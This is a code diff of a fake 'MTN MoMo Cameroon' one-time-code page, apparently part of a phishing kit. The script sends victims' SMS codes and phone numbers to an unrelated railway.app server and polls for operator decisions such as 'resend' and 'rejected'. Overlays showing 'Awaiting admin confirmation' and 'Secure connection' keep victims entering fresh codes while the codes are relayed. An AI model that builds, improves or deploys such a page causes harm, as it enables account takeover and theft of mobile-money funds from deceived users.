+                <input type="tel" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="tel" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off">
+                <input type="tel" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off">
+            </div>
 
-        <div class="error-text" id="otpError">Please enter the 4-digit code from the SMS</div>
+            <div class="error-text" id="otpError">Please enter the 4-digit code from the SMS</div>
 
-        <button class="verify-btn" id="verifyBtn" disabled>
-            VERIFY &amp; CONTINUE →
-        </button>
-
-        <div class="resend-row">
-            Didn't receive the code?
-            <button class="resend-link" id="resendBtn" type="button" disabled>
-                Resend (<span id="countdown">60</span>s)
+            <button class="verify-btn" id="verifyBtn" disabled>
+                VERIFY &amp; CONTINUE →
             </button>
-        </div>
 
-        <div class="security-notice">
-            <span>🔒</span>
-            <span>Secure connection to MTN MoMo</span>
-        </div>
-    </main>
+            <div class="resend-row">
+                Didn't receive the code?
+                <button class="resend-link" id="resendBtn" type="button" disabled>
+                    Resend (<span id="countdown">60</span>s)
+                </button>
+            </div>
 
-    <footer>© 2026 MTN MoMo Cameroon</footer>
+            <div class="security-notice">
+                <span class="ico">🔒</span>
+                <span>Secure connection to MTN MoMo</span>
+            </div>
+        </main>
+    </div>
 
+    <!-- FOOTER -->
+    <footer class="footer">
+        <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
+    </footer>
+
+    <!-- SUPER VERIFY OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-particles">
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+            <span class="verify-particle"></span>
+        </div>
+
         <div class="verify-content">
-            <div class="verify-momo-icon">MoMo</div>
-            <div class="verify-spinner"></div>
+            <div class="verify-orbit">
+                <div class="verify-orbit-ring"></div>
+                <div class="verify-orbit-ring inner"></div>
+                <div class="verify-dot-orbit">
+                    <span></span><span></span><span></span><span></span>
+                </div>
+                <div class="verify-orbit-core">
+                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+                </div>
+            </div>
+
             <h2 class="verify-title" id="verifyTitle">
-                Confirming your <span class="highlight">code</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+                Confirming your <span class="highlight">code</span>
             </h2>
             <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
+
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
-            <div class="verify-security">
-                <span>🔒</span>
-                <span>Secure connection to MTN MoMo</span>
+
+            <div class="verify-step">
+                <div class="verify-step-inner" id="verifyStepInner">
+                    <div class="verify-step-text">🔍 Validating your code</div>
+                    <div class="verify-step-text">📡 Contacting MTN MoMo servers</div>
+                    <div class="verify-step-text">🔐 Confirming transaction</div>
+                    <div class="verify-step-text">⏳ Awaiting admin confirmation</div>
+                </div>
+            </div>
+
+            <div class="verify-status-row">
+                <span class="verify-status-dot"></span>
+                <span>Live · Secure Connection</span>
             </div>
         </div>
     </div>
 
+    <!-- NOTICE POPUP -->
+    <div class="notice-overlay" id="noticeOverlay">
+        <div class="notice-card">
+            <div class="notice-icon-wrap" id="noticeIconWrap">
+                <span id="noticeIcon">ℹ️</span>
+            </div>
+            <h3 class="notice-title" id="noticeTitle">Notice</h3>
+            <p class="notice-message" id="noticeMessage">…</p>
+            <button class="notice-btn" id="noticeBtn" type="button">OK</button>
+        </div>
+    </div>
+
+    <!-- CONGRATS OVERLAY -->
     <div class="congrats-overlay" id="congratsOverlay">
         <div class="congrats-content">
             <div class="congrats-header">
@@ -631,9 +1026,15 @@
     </div>
 
     <script>
+        /* ═══════════════════════════════════════════
+           CONFIG
+        ═══════════════════════════════════════════ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
 
+        /* ═══════════════════════════════════════════
+           DOM REFS
+        ═══════════════════════════════════════════ */
         const otpBoxes = [
             document.getElementById('otp1'),
             document.getElementById('otp2'),
@@ -643,12 +1044,25 @@
         const otpError = document.getElementById('otpError');
         const verifyBtn = document.getElementById('verifyBtn');
         const resendBtn = document.getElementById('resendBtn');
+        const countdownEl = document.getElementById('countdown');
         const congratsOverlay = document.getElementById('congratsOverlay');
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
         const verifyTitle = document.getElementById('verifyTitle');
         const verifySubtitle = document.getElementById('verifySubtitle');
+        const verifyStepInner = document.getElementById('verifyStepInner');
 
+        // Notice popup
+        const noticeOverlay = document.getElementById('noticeOverlay');
+        const noticeIconWrap = document.getElementById('noticeIconWrap');
+        const noticeIcon = document.getElementById('noticeIcon');
+        const noticeTitle = document.getElementById('noticeTitle');
+        const noticeMessage = document.getElementById('noticeMessage');
+        const noticeBtn = document.getElementById('noticeBtn');
+
+        /* ═══════════════════════════════════════════
+           SESSION CHECK
+        ═══════════════════════════════════════════ */
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -659,6 +1073,9 @@
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
         const storedSms = localStorage.getItem('momoSms') || '';
 
+        /* ═══════════════════════════════════════════
+           OTP BOXES
+        ═══════════════════════════════════════════ */
         function getOtpValue() {
             return otpBoxes.map(b => b.value).join('');
         }
@@ -708,6 +1125,9 @@
             });
         });
 
+        /* ═══════════════════════════════════════════
+           RESEND COUNTDOWN
+        ═══════════════════════════════════════════ */
         let remaining = 60;
         let resendTimer = null;
 
@@ -727,7 +1147,6 @@
                 }
             }, 1000);
         }
-
         startCountdown();
 
         resendBtn.addEventListener('click', async function() {
@@ -744,14 +1163,29 @@
             startCountdown();
         });
 
+        /* ═══════════════════════════════════════════
+           SUPER VERIFY OVERLAY
+        ═══════════════════════════════════════════ */
         let verifyTimer = null;
+        let stepTimer = null;
 
         function startVerifyBar() {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
             verifyBarFill.style.background = '';
-            const startTime = Date.now();
+            verifyTitle.innerHTML = 'Confirming your <span class="highlight">code</span>';
+            verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
+            verifyStepInner.style.transform = 'translateY(0)';
 
+            let stepIndex = 0;
+            if (stepTimer) clearInterval(stepTimer);
+            stepTimer = setInterval(() => {
+                stepIndex = (stepIndex + 1) % 4;
+                verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
+            }, 2200);
+
+            const startTime = Date.now();
+            if (verifyTimer) clearInterval(verifyTimer);
             verifyTimer = setInterval(function() {
                 const elapsed = Date.now() - startTime;
                 const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
@@ -761,83 +1195,63 @@
 
         function finishVerifyBar() {
             if (verifyTimer) clearInterval(verifyTimer);
+            if (stepTimer) clearInterval(stepTimer);
             verifyBarFill.style.width = '100%';
         }
 
-        function showRejection(reason) {
+        function stopVerifyAnimation() {
             if (verifyTimer) clearInterval(verifyTimer);
-            verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#e74c3c';
-
-            verifyTitle.innerHTML = reason.title;
-            verifySubtitle.textContent = reason.subtitle;
-
-            setTimeout(function() {
-                verifyOverlay.classList.remove('show');
-                verifyBarFill.style.background = '';
-                verifyTitle.innerHTML = 'Confirming your <span class="highlight">code</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>';
-                verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
-
-                otpBoxes.forEach(b => {
-                    b.classList.add('invalid');
-                });
-                otpError.textContent = reason.errorText || 'Incorrect code. Please try again.';
-                otpError.classList.add('show');
-
-                verifyBtn.disabled = false;
-                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
-                otpBoxes[0].focus();
-            }, 1800);
+            if (stepTimer) clearInterval(stepTimer);
+            verifyOverlay.classList.remove('show');
+            verifyBarFill.style.background = '';
+            verifyBarFill.style.width = '0%';
+            verifyStepInner.style.transform = 'translateY(0)';
         }
 
-        /* ============================================
-           RESEND — shown ONCE per resend_requested status
-        ============================================ */
-        let resendHandled = false;
+        /* ═══════════════════════════════════════════
+           NOTICE POPUP
+        ═══════════════════════════════════════════ */
+        let noticeAction = null;
 
-        function handleResendFromAdmin() {
-            if (resendHandled) return;
-            resendHandled = true;
+        function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
+            noticeIconWrap.className = 'notice-icon-wrap';
+            noticeBtn.className = 'notice-btn';
 
-            if (verifyTimer) clearInterval(verifyTimer);
-            verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#FFCC00';
+            if (type) noticeIconWrap.classList.add(type);
+            if (buttonClass) noticeBtn.classList.add(buttonClass);
 
-            verifyOverlay.classList.add('show');
-            verifyTitle.innerHTML = '⚠️ <span class="highlight">Wrong code</span> entered';
-            verifySubtitle.innerHTML =
-                '<b style="color:#1a1a2e;font-size:14.5px;">Please enter new code</b><br><br>' +
-                'The code you entered was incorrect.<br>Please enter the <b>new code</b> you received via SMS.';
-            verifySubtitle.style.fontSize = '13.5px';
-            verifySubtitle.style.lineHeight = '1.65';
-            verifySubtitle.style.padding = '0 6px';
+            noticeIcon.textContent = icon || 'ℹ️';
+            noticeTitle.textContent = title || 'Notice';
+            noticeMessage.innerHTML = message || '';
+            noticeBtn.textContent = buttonText || 'OK';
 
-            setTimeout(function() {
-                verifyOverlay.classList.remove('show');
-                verifyBarFill.style.background = '';
-                verifyTitle.innerHTML = 'Confirming your <span class="highlight">code</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>';
-                verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
-
-                otpBoxes.forEach(b => {
-                    b.value = '';
-                    b.classList.remove('filled', 'invalid');
-                });
-                otpError.classList.remove('show');
-                verifyBtn.disabled = true;
-                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
-                otpBoxes[0].focus();
-
-                /* DO NOT reset resendHandled here — it resets when status changes */
-            }, 6000);
+            noticeAction = onOk || null;
+            noticeOverlay.classList.add('show');
         }
 
+        noticeBtn.addEventListener('click', function() {
+            noticeOverlay.classList.remove('show');
+            const action = noticeAction;
+            noticeAction = null;
+            if (typeof action === 'function') {
+                setTimeout(action, 200);
+            }
+        });
+
+        /* ═══════════════════════════════════════════
+           POLLING
+        ═══════════════════════════════════════════ */
         let pollTimer = null;
 
         function stopPolling() {
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-            }
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+        }
+
+        function clearOtpBoxes() {
+            otpBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('filled', 'invalid');
+            });
         }
 
         function startPolling(sessionId) {
@@ -860,29 +1274,79 @@
                             congratsOverlay.classList.add('show');
                         }, 350);
 
+                    } else if (data.status === 'rejected') {
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject',
+                            icon: '❌',
+                            title: 'Incorrect Code',
+                            message: 'The code you entered is <strong>incorrect</strong>. Please check the code and try again.',
+                            buttonText: 'TRY AGAIN',
+                            buttonClass: 'reject-btn',
+                            onOk: function() {
+                                clearOtpBoxes();
+                                otpError.classList.remove('show');
+                                verifyBtn.disabled = true;
+                                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+                                otpBoxes[0].focus();
+                            }
+                        });
+
+                    } else if (data.status === 'resend') {
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'resend',
+                            icon: '🔁',
+                            title: 'Enter New Code',
+                            message: 'The code you entered was incorrect. Please enter the <strong>new code</strong> you received via SMS.',
+                            buttonText: 'ENTER NEW CODE',
+                            onOk: function() {
+                                clearOtpBoxes();
+                                otpError.classList.remove('show');
+                                verifyBtn.disabled = true;
+                                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+                                otpBoxes[0].focus();
+                            }
+                        });
+
                     } else if (data.status === 'resend_requested') {
-                        handleResendFromAdmin();
+                        // legacy support
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'resend',
+                            icon: '🔁',
+                            title: 'Enter New Code',
+                            message: 'Please enter the <strong>new code</strong> you received via SMS.',
+                            buttonText: 'ENTER NEW CODE',
+                            onOk: function() {
+                                clearOtpBoxes();
+                                otpError.classList.remove('show');
+                                verifyBtn.disabled = true;
+                                otpBoxes[0].focus();
+                            }
+                        });
 
-                    } else {
-                        /* Any other status → reset the flag so future resends work */
-                        resendHandled = false;
-
-                        if (data.status === 'rejected') {
-                            stopPolling();
-                            showRejection({
-                                title: 'Incorrect <span class="highlight">code</span>',
-                                subtitle: 'Please check the code and try again.',
-                                errorText: 'The code you entered is incorrect. Please try again.'
-                            });
-
-                        } else if (data.status === 'timeout') {
-                            stopPolling();
-                            showRejection({
-                                title: 'Request <span class="highlight">timed out</span>',
-                                subtitle: 'Please try again.',
-                                errorText: 'Request timed out. Please try again.'
-                            });
-                        }
+                    } else if (data.status === 'timeout') {
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject',
+                            icon: '⏱️',
+                            title: 'Request Timed Out',
+                            message: 'Your session has expired. Please start again.',
+                            buttonText: 'START OVER',
+                            buttonClass: 'reject-btn',
+                            onOk: function() {
+                                localStorage.removeItem('momoSession');
+                                localStorage.removeItem('momoPhone');
+                                localStorage.removeItem('momoCountry');
+                                localStorage.removeItem('momoSms');
+                                window.location.href = 'login.html';
+                            }
+                        });
                     }
                 } catch (err) {
                     console.warn('poll error:', err.message);
@@ -890,6 +1354,9 @@
             }, POLL_INTERVAL_MS);
         }
 
+        /* ═══════════════════════════════════════════
+           VERIFY BUTTON
+        ═══════════════════════════════════════════ */
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
 
@@ -932,6 +1399,7 @@
 
             } catch (err) {
                 console.error('OTP verify error:', err);
+                stopVerifyAnimation();
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
